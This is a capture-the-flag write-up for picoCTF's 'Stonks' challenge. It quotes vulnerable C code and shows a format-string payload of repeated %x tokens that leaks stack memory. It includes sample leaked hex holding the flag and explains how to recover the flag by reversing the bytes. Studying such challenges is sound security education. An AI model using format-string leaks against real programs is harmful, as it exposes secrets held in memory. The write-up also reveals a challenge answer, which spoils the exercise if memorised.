## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! `vuln.c` `nc mercury.picoctf.net 33411`



## Approach
1. By analyzing the `vuln.c`, we can find the code below.
Then, we can know before inputting the API token, file `api` will be read.
```
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
```


2. Then we can pop data off of the stack by inputting several `%x` as API token, such as `%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`. And then we can get the data like the one: `8d34390804b00080489c3f7f97d80ffffffff18d32160f7fa5110f7f97dc708d3318038d343708d343906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffc5007df7fd2af8`

3. Because we know the flag starts with `pico` and its ASCII hex is `7069636f`, we can try to find something simiar. However, we can only find its reverse, like `6f636970` because of stack, but it is still a good news.

4. So just reverse data and rearrange them, we can get the final answer.